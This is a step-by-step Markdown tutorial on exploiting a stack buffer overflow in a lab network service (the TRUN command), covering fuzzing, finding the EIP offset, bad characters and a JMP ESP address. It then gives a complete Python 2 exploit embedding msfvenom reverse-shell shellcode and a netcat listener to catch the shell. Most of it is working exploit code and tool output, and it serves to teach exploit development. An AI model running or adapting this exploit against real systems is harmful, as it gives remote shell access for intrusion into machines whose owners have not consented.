# Buffer Overflows

NOTE: examples here are Python2 - Python3 handles strings and bytes differently. See footnote.

## Spiking
Potentially vulnerable app? If it's a network app try sending data to it to cause a crash.

**Tool**: /usr/bin/generic_send_tcp from https://gitlab.com/kalilinux/packages/spike/

Requires a config file:

root@:/bof-practice# cat stats.spk 
> s_readline();  
> s_string("STATS ");         <---- reads a line from the remote source, then sends "STATS " followed by fuzz  
> s_string_variable("0");  

root@:/bof-practice# cat trun.spk 
> s_readline();  
> s_string("TRUN ");          <---- reads a line from the remote source, then sends "TRUN " followed by fuzz  
> s_string_variable("0");  

Run until you either find an overflow or tool finishes eg:

> generic_send_tcp 192.168.54.128 9999 stats.spk 0 0  
> generic_send_tcp 192.168.54.128 9999 trun.spk 0 0

Once you've found the vulnerable function move to fuzzing.
***
## Fuzzing
We've identified the vulnerable binary, and the function/variable etc that can potentially be exploited.
Now start sending progressively longer blobs of data until we know roughly how big the app's buffer is.

**Tool**: python  
**Tool**: Immunity Debugger  https://www.immunityinc.com/products/debugger/  

Create a simple python script to send progressively larger buffers to the vulnerable service. Note: in this case the service is expecting a short preamble.

```python
#! /usr/bin/python  
import sys, socket  
from time import sleep  

buffer = "A" * 100  

while True:  
	try:  
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
		s.connect(('192.168.54.128',9999))  
		s.send(('TRUN /.:/' + buffer))  
		s.close()  
		sleep(1)  
		buffer = buffer + "A" * 100  
	except:  
		print "Fuzzing crashed at %s bytes" % str(len(buffer))  
		sys.exit()  
```  

### Prepare the target machine:  
1. On the target machine, launch the vulnerable service as admin.  
2. Again on the target machine, launch debugger eg Immunity as admin.  
3. Finally, on the target machine, attach the debugger to the running process.  

### Launch the fuzzer
1. From the attack machine, launch the python script.
1. Observe the debugger on the target machine. When the vulnerable service crashes, CTRL+C the Python fuzzer script.
1. Make a note of how many bytes were sent. This gives an upper bound of the buffer size.

Observe the contents of the following registers on the target machine:
1. ESP
1. EIP
1. EBP

Have we overwritten the EIP? 

***
## Finding the Offset
We've discovered roughly how many bytes are needed to crash the service. Now we need to identify exactly how many bytes it takes to overwrite the EIP.  

**Tool**: /usr/share/metasploit-framework/tools/exploit/pattern_create.rb
**Tool**: on Kali can just run msf-pattern_create and msf-pattern_offset

**Tool**: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb

Use the Metasploit tool pattern_create.rb to create a de Bruijn sequence of the length determined in the Fuzzing step.

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3200 > 3200.txt
```
  
This will create a non-repeating cyclic pattern:  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3A...  

By sending this to the vulnerable service we *should* be able to determine exactly which offset is required to overwrite CPU registers eg ESP, EIP, EBP.

Create another python script to send the de Bruijn sequence:

```python
 #!/usr/bin/python
import sys, socket
from time import sleep

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec"

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.54.128',9999))
	
	s.send(('TRUN /.:/' + buffer))
	s.close()

except:
	print "CRASH!"
	sys.exit()
```

### Prepare the target machine:  
1. On the target machine, launch the vulnerable service as admin.  
2. Again on the target machine, launch debugger eg Immunity as admin.  
3. Finally, on the target machine, attach the debugger to the running process.  

### Launch the script
1. From the attack machine, launch the python script.
1. Observe the debugger on the target machine. When the vulnerable service crashes, CTRL+C the Python fuzzer script.
1. Make a note of the EIP register value eg 386f4337

Use the pattern_offset.rb tool to identify the offset required to overwrite the EIP. Note: the "length" parameter must match the length used when generating the sequence.

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3200 -q 386f4337
[*] Exact match at offset 2003
```
In this case we need 2003 bytes to reach the start of the EIP. The next 4 bytes will overwrite the EIP.


***
## Overwriting the EIP

Confirm that we do in fact have control of the EIP.

Create a python script:

```python
#!/usr/bin/python
import sys, socket
from time import sleep

shellcode = "A" * 2003 + "B" * 4

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.54.128',9999))
	
	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:
	print "CRASH!"
	sys.exit()
```

This script should fill up the buffer with 2003 x "A" (0x41) followed by overwriting the EIP with 4 x "B" (0x42).

### Prepare the target machine:  
1. On the target machine, launch the vulnerable service as admin.  
2. Again on the target machine, launch debugger eg Immunity as admin.  
3. Finally, on the target machine, attach the debugger to the running process.  

### Launch the script
1. From the attack machine, launch the python script.
1. Observe the debugger on the target machine. When the vulnerable service crashes, CTRL+C the Python fuzzer script.
1. Make a note of the EIP register value.  

If the EIP value = 4 x "B" ie hex:42424242 then we have demonstrated control of the EIP.

***
## Finding Bad Chars

When preparing shellcode we need to be sure that characters we send will not be interpreted by the vulnerable app/service or by the operating system.

The possible list of all characters is:

```c
badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

It is safe to assume that "\x00" is "bad", almost every OS and C-based service will treat this character in some special way. Therefore, when testing we shall only use "\x01" -> "\xff".

Create a script to send the (slightly) reduced character list (note: \x00 is not sent):

```python
#! /usr/bin/python
import sys, socket
from time import sleep


badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

shellcode = "A" * 2003 + "B" * 4 + badchars

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.54.128',9999))
	
	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:
	print "CRASH!"
	sys.exit()

```

This script should fill up the buffer with 2003 x "A" (0x41) followed by overwriting the EIP with 4 x "B" (0x42); and the next memory addresses should be filled with the complete set of badchars - *in order, and with no omissions or substitutions*.

### Prepare the target machine:  
1. On the target machine, launch the vulnerable service as admin.  
2. Again on the target machine, launch debugger eg Immunity as admin.  
3. Finally, on the target machine, attach the debugger to the running process.  

### Launch the script
1. From the attack machine, launch the python script.
1. Observe the debugger on the target machine. When the vulnerable service crashes, CTRL+C the Python fuzzer script.
1. Make a note of the EIP register value. Confirm it is overwritten with hex:42424242
1. We need to see the contents of RAM after the ESP. Right click on the ESP and click on "Follow in Dump".

Examine the contents of memory starting at the ESP address. We should see all the badchars represented contiguously in memory ie 
01 02 03 04 05 06 07 08 ...

If we see any characters that are out of place/incorrect then we have identified characters that cannot be in our shellcode.

### Use mona to check for bad chars
This python code will generate all possible chars. Place the output file somewhere convenient on the target.
Follow the same steps above to put the potential bad chars into the target's memory. Then use mona to compare memory to the output file:

```python
#!/usr/bin/env python2

badchar_test = ""         # start with an empty string
badchars = [0x00, 0x0A]   # we've reasoned that these are definitely bad

# generate the string
for i in range(0x00, 0xFF+1):     # range(0x00, 0xFF) only returns up to 0xFE
  if i not in badchars:           # skip the badchars
    badchar_test += chr(i)        # append each non-badchar char to the string

# open a file for writing ("w") the string as binary ("b") data
with open("badchar_test.bin", "wb") as f:
  f.write(badchar_test)
  ```

!mona compare -a esp -f c:\badchar_test.bin

***
## Finding a JMP ESP etc in the Right Module

Now that we know how to overwrite the EIP, and we know what characters cannot be used we need to find a piece of assembly that will allow us to execute our shell code. The assembly must exist within a loaded module, and ideally have no protections eg DEP, ALR etc.

We will use mona.py in conjunction with Immunity Debugger.

**Tool**: https://github.com/corelan/mona  
**Tool**: /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb  
**Tool**: msf-nasm_shell  
**Tool**: !mona find -s "\xff\xe4" -m   

### Find the **op code** of the assembly instructions we wish the EIP to point to:
1. Run /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
1. Enter the assembly of the instruction. Op Codes will be returned.

In this case we want the EIP to point to an instruction that JMPs to the address stored in ESP. The memory starting at ESP will contain the shellcode we wish to execute. (In the previous step it contained the badchars string.)

```
root@host:~/# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb  
nasm > JMP ESP
00000000  FFE4              jmp esp
nasm > 
```

### Prepare the target machine:  
1. On the target machine, launch the vulnerable service as admin.  
2. Again on the target machine, launch debugger eg Immunity as admin.  
3. On the target machine, attach the debugger to the running process.  
1. Run **```!mona modules```** to identify all loaded modules and their memory/execution protections.
1. Identify a module that has "False" across the board, that is attached to the vulnerable app.
1. Find an opcode of FF E4 in this module. Use mona again - this time:  
**```!mona find -s "\xff\xe4" -m essfunc.dll```**

We get an address within the essfunc.dll for the JMP ESP instruction: 0x625011AF

Or - use mona to search all modules for a JMP ESP - excluding bad chars \x00 and \x0A
**!mona jmp -r esp -cpb "\x00\x0A"**

### Test the JMP ESP pointer by setting a breakpoint on the address where it's stored
Create a python script. 

```python
#! /usr/bin/python
import sys, socket
from time import sleep

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" 

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.54.128',9999))
	
	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:
	print "CRASH!"
	sys.exit()
```

This script should simply push the address of the memory containing the JMP ESP instruction into the EIP ie 0x625011AF

### NOTE: THE FORMAT OF THE ADDRESS IS LITTLE-ENDIAN and thus is "reversed"

address: aabbccdd -> \xdd\xcc\xbb\xaa

### Prepare the target machine:  
1. On the target machine, launch the vulnerable service as admin.  
2. Again on the target machine, launch debugger eg Immunity as admin.  
3. Finally, on the target machine, attach the debugger to the running process. 
1. In Immunity, use the "Go to address in Disassembler" button to jump to the address we're interested in: 625011AF
1. Confirm that the contents of that memory address contain "JMP ESP"
1. Set a breakpoint on this address ("F2" key)
1. Start the program running again.
1. Execute the python script.

If the breakpoint is reached we know that we can successfully alter the vulnerable app's control flow; and potentially execute code of our choice.

***
## Generate Shellcode

Now we need something to execute.

**Tool**: msfvenom

Use msfvenom to create Windows reverse shell - non-staged. Note: we're excluding badchars:

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.54.129 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xbd\x7d\xd0\xee\xad\xda\xc5\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x31\x6e\x12\x83\xc6\x04\x03\x13\xde\x0c\x58\x17\x36\x52"
"\xa3\xe7\xc7\x33\x2d\x02\xf6\x73\x49\x47\xa9\x43\x19\x05\x46"
"\x2f\x4f\xbd\xdd\x5d\x58\xb2\x56\xeb\xbe\xfd\x67\x40\x82\x9c"
"\xeb\x9b\xd7\x7e\xd5\x53\x2a\x7f\x12\x89\xc7\x2d\xcb\xc5\x7a"
"\xc1\x78\x93\x46\x6a\x32\x35\xcf\x8f\x83\x34\xfe\x1e\x9f\x6e"
"\x20\xa1\x4c\x1b\x69\xb9\x91\x26\x23\x32\x61\xdc\xb2\x92\xbb"
"\x1d\x18\xdb\x73\xec\x60\x1c\xb3\x0f\x17\x54\xc7\xb2\x20\xa3"
"\xb5\x68\xa4\x37\x1d\xfa\x1e\x93\x9f\x2f\xf8\x50\x93\x84\x8e"
"\x3e\xb0\x1b\x42\x35\xcc\x90\x65\x99\x44\xe2\x41\x3d\x0c\xb0"
"\xe8\x64\xe8\x17\x14\x76\x53\xc7\xb0\xfd\x7e\x1c\xc9\x5c\x17"
"\xd1\xe0\x5e\xe7\x7d\x72\x2d\xd5\x22\x28\xb9\x55\xaa\xf6\x3e"
"\x99\x81\x4f\xd0\x64\x2a\xb0\xf9\xa2\x7e\xe0\x91\x03\xff\x6b"
"\x61\xab\x2a\x3b\x31\x03\x85\xfc\xe1\xe3\x75\x95\xeb\xeb\xaa"
"\x85\x14\x26\xc3\x2c\xef\xa1\x2c\x18\xd9\xb0\xc5\x5b\x25\xa2"
"\x49\xd5\xc3\xae\x61\xb3\x5c\x47\x1b\x9e\x16\xf6\xe4\x34\x53"
"\x38\x6e\xbb\xa4\xf7\x87\xb6\xb6\x60\x68\x8d\xe4\x27\x77\x3b"
"\x80\xa4\xea\xa0\x50\xa2\x16\x7f\x07\xe3\xe9\x76\xcd\x19\x53"
"\x21\xf3\xe3\x05\x0a\xb7\x3f\xf6\x95\x36\xcd\x42\xb2\x28\x0b"
"\x4a\xfe\x1c\xc3\x1d\xa8\xca\xa5\xf7\x1a\xa4\x7f\xab\xf4\x20"
"\xf9\x87\xc6\x36\x06\xc2\xb0\xd6\xb7\xbb\x84\xe9\x78\x2c\x01"
"\x92\x64\xcc\xee\x49\x2d\xec\x0c\x5b\x58\x85\x88\x0e\xe1\xc8"
"\x2a\xe5\x26\xf5\xa8\x0f\xd7\x02\xb0\x7a\xd2\x4f\x76\x97\xae"
"\xc0\x13\x97\x1d\xe0\x31";
```

Note the size of the payload. Sometimes we have very little memory to use.

Add the shellcode to the last Python script. If we have done this correctly this exploit will overwrite the vulnerable app's buffer, replace the EIP with a pointer to an instruction to "JMP ESP", and at the ESP we've placed our shellcode. If the shellcode executes correctly we'll get a reverse shell thrown to our IP:port combination specified in the msfvenom command.

In this case we also pad the payload with some NOPs "\x90".


```python
#! /usr/bin/python
import sys, socket
from time import sleep

overflow = (
"\xb8\x0d\x15\x6c\xa4\xda\xc0\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x31\x43\x12\x03\x43\x12\x83\xce\x11\x8e\x51\x2c\xf1\xcc"
"\x9a\xcc\x02\xb1\x13\x29\x33\xf1\x40\x3a\x64\xc1\x03\x6e\x89"
"\xaa\x46\x9a\x1a\xde\x4e\xad\xab\x55\xa9\x80\x2c\xc5\x89\x83"
"\xae\x14\xde\x63\x8e\xd6\x13\x62\xd7\x0b\xd9\x36\x80\x40\x4c"
"\xa6\xa5\x1d\x4d\x4d\xf5\xb0\xd5\xb2\x4e\xb2\xf4\x65\xc4\xed"
"\xd6\x84\x09\x86\x5e\x9e\x4e\xa3\x29\x15\xa4\x5f\xa8\xff\xf4"
"\xa0\x07\x3e\x39\x53\x59\x07\xfe\x8c\x2c\x71\xfc\x31\x37\x46"
"\x7e\xee\xb2\x5c\xd8\x65\x64\xb8\xd8\xaa\xf3\x4b\xd6\x07\x77"
"\x13\xfb\x96\x54\x28\x07\x12\x5b\xfe\x81\x60\x78\xda\xca\x33"
"\xe1\x7b\xb7\x92\x1e\x9b\x18\x4a\xbb\xd0\xb5\x9f\xb6\xbb\xd1"
"\x6c\xfb\x43\x22\xfb\x8c\x30\x10\xa4\x26\xde\x18\x2d\xe1\x19"
"\x5e\x04\x55\xb5\xa1\xa7\xa6\x9c\x65\xf3\xf6\xb6\x4c\x7c\x9d"
"\x46\x70\xa9\x32\x16\xde\x02\xf3\xc6\x9e\xf2\x9b\x0c\x11\x2c"
"\xbb\x2f\xfb\x45\x56\xca\x6c\xaa\x0f\xe2\xed\x42\x52\x0a\xff"
"\xce\xdb\xec\x95\xfe\x8d\xa7\x01\x66\x94\x33\xb3\x67\x02\x3e"
"\xf3\xec\xa1\xbf\xba\x04\xcf\xd3\x2b\xe5\x9a\x89\xfa\xfa\x30"
"\xa5\x61\x68\xdf\x35\xef\x91\x48\x62\xb8\x64\x81\xe6\x54\xde"
"\x3b\x14\xa5\x86\x04\x9c\x72\x7b\x8a\x1d\xf6\xc7\xa8\x0d\xce"
"\xc8\xf4\x79\x9e\x9e\xa2\xd7\x58\x49\x05\x81\x32\x26\xcf\x45"
"\xc2\x04\xd0\x13\xcb\x40\xa6\xfb\x7a\x3d\xff\x04\xb2\xa9\xf7"
"\x7d\xae\x49\xf7\x54\x6a\x69\x1a\x7c\x87\x02\x83\x15\x2a\x4f"
"\x34\xc0\x69\x76\xb7\xe0\x11\x8d\xa7\x81\x14\xc9\x6f\x7a\x65"
"\x42\x1a\x7c\xda\x63\x0f")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow 


try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.54.128',9999))
	
	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:
	print "CRASH!"
	sys.exit()
```

***
## Raining Shell!

Now run it:

### Prepare the target machine:  
1. On the target machine, launch the vulnerable service as admin.

### Prepare the attack machine:  
1. On the attack machine start a netcat listener to catch our shell: **```nc -klnvp 4444```**
1. Run the exploit
1. Check for an incoming shell
1. Root dance!



Footnote:

The Python 2 code essentially builds up a byte string. In Python 3, '...' string literals build up a Unicode string object instead.

In Python 3, you want bytes objects instead, which you can creating by using b'...' byte string literals:

# --- SNIP ---
shellcode =  b""
shellcode += b"\x89\xe2\xd9\xcf\xd9\x72\xf4\x5a\x4a\x4a\x4a\x4a\x4a"
# --- SNIP ---
offset = b"A" * 2606
eip = b"\x43\x62\x4b\x5f"
nop = b"\x90" * 16 
padding = b"C"
buff = offset + eip + nop + shellcode + padding * (424 - 351 - 16)
# --- SNIP ---
bytes_sent = sock.send(b"PASS %s\r\n" % buff)
# --- SNIP ---
